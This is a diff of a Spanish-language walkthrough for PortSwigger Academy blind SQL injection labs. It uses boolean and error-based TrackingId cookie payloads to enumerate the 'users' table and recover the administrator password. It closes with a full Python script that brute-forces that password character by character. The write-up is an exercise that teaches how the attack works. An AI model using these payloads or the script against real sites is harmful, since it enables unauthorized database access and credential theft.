@@ -723,7 +723,7 @@ Como vemos obviamente nos da error y no nos muestra lo que haría la consulta en
 
 Ahora que sabemos que podemos basarnos en este mensaje de bienvenida procederemos a inyectar cosas más interesantes, sabemos que hay una tabla llamada **users**, por lo que haremos lo siguiente:
 
-`TrackingId=oRAy9H26tmKe3R9F' AND (SELECT '1' FROM users limit 1)='1`
+`TrackingId=xyz' AND (SELECT '1' FROM users limit 1)='1`
 
 Primero estamos haciendo una sub consulta en medio de los paréntesis, y dentro de ella decimos que nos tome el valor por ejemplo '1' y que esta selección la haga dentro de la tabla **users** que como sabemos existe, limitando el resultado al primer registro, ya que debe tener algo en que dejar ese valor, y después si esto que hicimos en la consulta se puede cumplir sin errores o sea **FROM users limit 1**, entonces nos permitirá comparar si ese valor '1' es igual al '1' que está fuera de la consulta, así que al interpretarse la sub consulta, y en caso de que lo de la sub consulta sea **true** entonces la consulta normal será algo como **AND '1'='1'**, el primer uno se tomara en cuenta siempre y cuando lo de su sub consulta se cumpla, ya que de lo contrario daría error y se estaría comparando un error con el valor '1' que hay fuera de la sub consulta y obviamente nos daría **false** sin mostrarnos el mensaje de bienvenida.
 
@@ -735,13 +735,13 @@ Así que esto nos respondería lo siguiente:
 
 Esto quiere decir que existe la tabla **users**, ahora probaremos lo siguiente:
 
-`TrackingId=oRAy9H26tmKe3R9F' AND (SELECT SUBSTRING(username,1,1) FROM users limit 1)='a`
+`TrackingId=xyz' AND (SELECT SUBSTRING(username,1,1) FROM users limit 1)='a`
 
 Aquí vemos un par de cosas nuevas, primero, dentro de la subconsulta, usamos la función **substring()**, y lo que hace esta función es obtener los valores por separado de una cierta cadena de texto, por ejemplo en este ejemplo de la función **SELECT SUBSTRING("Hola mundo", 1, 3)**, en este ejemplo estamos seleccionando lo que nos devolverá la función, dentro de la función la cadena será "Hola mundo" para después con el segundo parámetro el cual es 1, indicando que queremos que empiece desde el primer carácter, o sea "H", y el valor 3 indica la cantidad a mostrar después de ese primer carácter, en este caso el resultado de esto sería: "Hol".
 
 Ahora que sabemos el uso de esta función, volvamos a la sub consulta:
 
-`TrackingId=oRAy9H26tmKe3R9F' AND (SELECT SUBSTRING(username,1,1) FROM users limit 1)='a`
+`TrackingId=xyz' AND (SELECT SUBSTRING(username,1,1) FROM users limit 1)='a`
 
 Recordemos que aquí estamos seleccionando lo que nos devuelva la función **substring()**, dentro de esta función le decimos que empiece a tomar del primer carácter, y queremos que nos tome solo 1 carácter, después esto lo tomaremos del primer registro de la tabla **users**, cuando digo registro me refiero a la primera fila de dicha tabla.
 
@@ -757,7 +757,7 @@ Así que en base a esto, podemos hacer algo para ir verificando carácter por ca
 
 Podemos ir fuzzeando el nombre del primer registro manualmente así:
 
-`TrackingId=FOOgF1BfxfMqbkj1' AND (SELECT SUBSTRING(username,1,1) FROM users limit 1)='a`
+`TrackingId=xyz' AND (SELECT SUBSTRING(username,1,1) FROM users limit 1)='a`
 
 Vemos que esta consulta es la misma que explique arriba, pero ahora la usaremos para lo que queremos, primero indicamos que queremos comprobar si el primer carácter del primer registro donde la columna sea **username** en la tabla **users** es igual al carácter 'a'.
 
@@ -769,7 +769,7 @@ Vemos que nos muestra el mensaje de bienvenida, por lo que ese primer carácter 
 
 Así que ahora cambiaremos la consulta por:
 
-`TrackingId=FOOgF1BfxfMqbkj1' AND (SELECT SUBSTRING(username,2,1) FROM users limit 1)='a`
+`TrackingId=xyz' AND (SELECT SUBSTRING(username,2,1) FROM users limit 1)='a`
 
 Que ahora los seleccione desde el segundo carácter, y solo queremos tomar un valor de ahí en adelante, esto es lo mismo, y como el segundo carácter no es "a", nos mostrara esto:
 
@@ -777,7 +777,7 @@ Que ahora los seleccione desde el segundo carácter, y solo queremos tomar un va
 
 Por lo que probaremos otro carácter:
 
-`TrackingId=FOOgF1BfxfMqbkj1' AND (SELECT SUBSTRING(username,2,1) FROM users limit 1)='d`
+`TrackingId=xyz' AND (SELECT SUBSTRING(username,2,1) FROM users limit 1)='d`
 
 Y nos responde:
 
@@ -787,7 +787,7 @@ Y vemos que el segundo carácter si es "d".
 
 Por lo que nos podemos dar la idea de que el usuario es "administrator", así que modificaremos nuestra consulta:
 
-`TrackingId=FOOgF1BfxfMqbkj1' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
+`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`
 
 Lo que hicimos fue volver a lo de 'a'='a' para comprobar si lo que hay en la sub consulta es **true**, en este caso agregamos que nos seleccione 'a' de la tabla sea **users** donde la columna **username** sea igual a el valor **"administrator"** y en caso de que esto exista pasara a comprobar nuestro primer valor 'a' con el segundo valor 'a', mostrándonos el mensaje de bienvenida:
 
@@ -800,7 +800,7 @@ Ahora que sabemos que el usuario es correcto, iremos a fuzzear su columna de **p
 
 Primero obtendremos el tamaño de la contraseña, por lo que usaremos esta consulta:
 
-`TrackingId=FOOgF1BfxfMqbkj1' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
+`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a`
 
 Aquí estamos haciendo lo que ya sabemos de validar "a" = "a", para comprobar si la sub consulta devuelve un **true** o **false**, pero en este caso le estamos indicando que seleccione el valor "a" de la tabla **users** donde la columna **username** tenga de valor **"administrator"** entonces en ese lugar en caso de ser correcto lo anterior, pasara a el operador AND, diciendo que si la longitud del valor **password** dentro de ese registro que fuimos anteriormente es mayor a 2, en caso de ser cierto nos mostrara lo siguiente:
 
@@ -820,7 +820,7 @@ Usamos el Mayor o igual para determinar la longitud y dimos con que era 20 carac
 
 Ahora que ya sabemos la longitud de la contraseña procederemos a descubrirla, primero usaremos esta consulta:
 
-`TrackingId=FOOgF1BfxfMqbkj1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
+`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
 
 Lo que estamos haciendo aquí es decirle que nos seleccione el primer carácter de la columna **password** de la tabla **users** donde la columna **username** contenga el valor de **"administrator"**, para después comparar ese valor con el que está fuera de la sub consulta, en este caso es "a".
 
@@ -920,7 +920,7 @@ Pero esta vez con el título de **"Password"**, el estado de este objeto de prog
 
 Como recordaremos, para descubrir el primer carácter de la contraseña del usuario **administrator** usamos la vulnerabilidad SQLi ciega de este laboratorio que era esto:
 
-`TrackingId=FOOgF1BfxfMqbkj1' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
+`TrackingId=xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a`
 
 Entonces lo que debemos hacer es automatizar el cambio de posición de la substring de la contraseña y a la vez ir intentando con cada carácter posible, para eso creamos la variable **characters**, pero para ir cambiando de posiciones necesitaremos hacer lo siguiente:
 
@@ -1167,7 +1167,7 @@ Y vemos que nos responde:
 
 Por lo que al parecer esta funcionando correctamente y nos esta interpretando nuestras consultas, lo que sigue es, como ya tenemos la tabla y el usuario que el mismo laboratorio nos proporciono, lo que haremos es crear una consulta:
 
-`TrackingId=krzCSjZVDR06s8PR'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator')||'`
+`TrackingId=xyz'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administrator')||'`
 
 Va de derecha a izquierda, primero comprueba que exista el usuario "administrator" en la tabla users, si esto es verdadero ira a el case de select, y revisara si 1=1, entonces provocara intencionalmente un error de estado 500 dividiendo 1 entre 0, y como esto no se puede nos dara un error, con este error nos daremos cuenta de que la peticion tomo valor de true, por lo que sabemos que el usuario existe ya que paso por el primer case.
 
@@ -1189,7 +1189,7 @@ Podemos apreciar que nos da un error 500, por lo que en teoria el usuario admini
 
 Ya que de lo contrario al poner un usuario inexistente como por ejemplo:
 
-`TrackingId=krzCSjZVDR06s8PR'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administadada')||'`
+`TrackingId=xyz'||(select case when (1=1) then to_char(1/0) else '' end from users where username='administadada')||'`
 
 Y nos respondera:
 
@@ -1199,4 +1199,108 @@ Por lo que sabemos que esta interpretando nuestras consultas y nos esta devolvie
 
 <br>
 
-Ahora intentaremos descubrir cuantos caracteres contiene la contraseña del usuario administrator. punto 10.
+Ahora intentaremos descubrir cuantos caracteres contiene la contraseña del usuario administrator.
+
+`TrackingId=xyz'||(select case when LENGTH(password)>10 then to_char(1/0) else '' end from users where username='administrator')||'`
+
+Ahora lo que hicimos fue reemplazar la condicion que siempre era verdadera "(1=1)" que usamos para comprobar la existencia de tablas y columnas, esta la reemplazaremos por una consulta, esta consulta servira para verificar si la cantidad de caracteres de la contraseña es mayor a 10.
+
+Como recordamos empieza de izquierda a derecha, por lo que primero verifica si existe el usuario "administrator" dentro de la tabla "users", en caso de que exista comprobara si la longitud del valor password anteriormente seleccionado de la fila donde el usuario es administrator, verificara si es mayor a 10 caracteres, y en caso de ser cierto como sabemos nos provocara el error 500, y en caso de ser falso irá a el else mostrandonos una cadena vacia y un estado de codigo 200. lo cual sabemos que sería false.
+
+Y al tramitar esta consulta recibimos esta respuesta:
+
+![l1](/assets/images/SQLiPortswigger/lab12/length1.png)
+
+Vemos que nos responde en la parte derecha con un estado de error 500, lo cual significa que es verdadero, o sea que la contraseña de administrator tiene más de 10 caracteres de longitud.
+
+<br>
+
+Por lo que ahora le diremos que si es mayor a 25 caracteres:
+
+`TrackingId=xyz'||(select case when LENGTH(password)>25 then to_char(1/0) else '' end from users where username='administrator')||'`
+
+y nos responde:
+
+![l2](/assets/images/SQLiPortswigger/lab12/length2.png)
+
+Ahora vemos que nos da un estado de 200, por lo cual indica que es false, así que debemos seguir hasta descubrir la longitud de la contraseña:
+
+![l3](/assets/images/SQLiPortswigger/lab12/length3.png)
+
+Después de varios intentos, descubrimos que la contraseña es igual a 20 caracteres.
+
+<br>
+
+Por lo que al saber esto ahora debemos enumerar dicha contraseña del usuario administrator.
+
+Reutilizaremos el script que ya habiamos creado.
+
+Pero esta vez solo cambiaremos algunas cosas:
+
+![cambio](/assets/images/SQLiPortswigger/lab12/cambio.png)
+
+Lo que se ve en verde es lo que estaba antes y lo que se ve en rojo es lo nuevo que hemos puesto en lugar de eso.
+
+Primero la variable "main_url", que es obvio que debe cambiar ya que es otro laboratorio.
+
+Después el payload de la cookie, el cual agregamos nuestro nuevo payload de cookie, y también usamos los espacios donde se iran fuzeando los diferentes caracteres y posiciones.
+
+También cambio la sesion ya que como en main_url, es otro laboratorio.
+
+Y por ultimo cambiamos lo de verificar si en la respuesta nos devolvia el mensaje "WelcomeBack!", ya que ahora nos basaremos en la respuesta del servidor, por lo que usamos esta linea:
+
+`if  r.status_code == 500:`
+
+Y el script nos queda de la siguiente forma:
+
+```python3
+#!/usr/bin/python3
+
+from pwn import *
+import requests, signal, time, pdb, sys, string
+
+def def_handler(sig, frame):
+    print("\n\n[!] Saliendo...\n")
+    sys.exit(1)
+
+#CTRL+C
+signal.signal(signal.SIGINT, def_handler)
+
+main_url = "https://0ad400e704c50f56c067044e00340081.web-security-academy.net"
+characters = string.ascii_lowercase + string.digits
+
+def makeRequest():
+
+    password = ""
+
+    p1 = log.progress("Fuerza bruta")
+    p1.status("Iniciando ataque de fuerza bruta")
+
+    time.sleep(2)
+
+    p2 = log.progress("Password")
+
+    for position in range(1,21):
+
+        for character in characters:
+
+            cookies = {
+                'TrackingId': "1XdkxLl4gbzwLsIZ'||(select CASE WHEN SUBSTR(password,%d,1)='%s' then TO_CHAR(1/0) else '' end FROM users WHERE username='administrator')||'" % (position, character),
+                'session': 'RxsbjGd7h0vXIfDaHFy7lIssTkUIwHwn'
+            }
+
+            p1.status(cookies['TrackingId'])
+
+            r = requests.get(main_url, cookies=cookies)
+
+            if  r.status_code == 500:
+                password += character
+                p2.status(password)
+                break
+
+if __name__ == '__main__':
+
+    makeRequest()
+```
+
+Por lo que si ya entendimos la logica podremos ejecutarlo y completar este laboratorio.
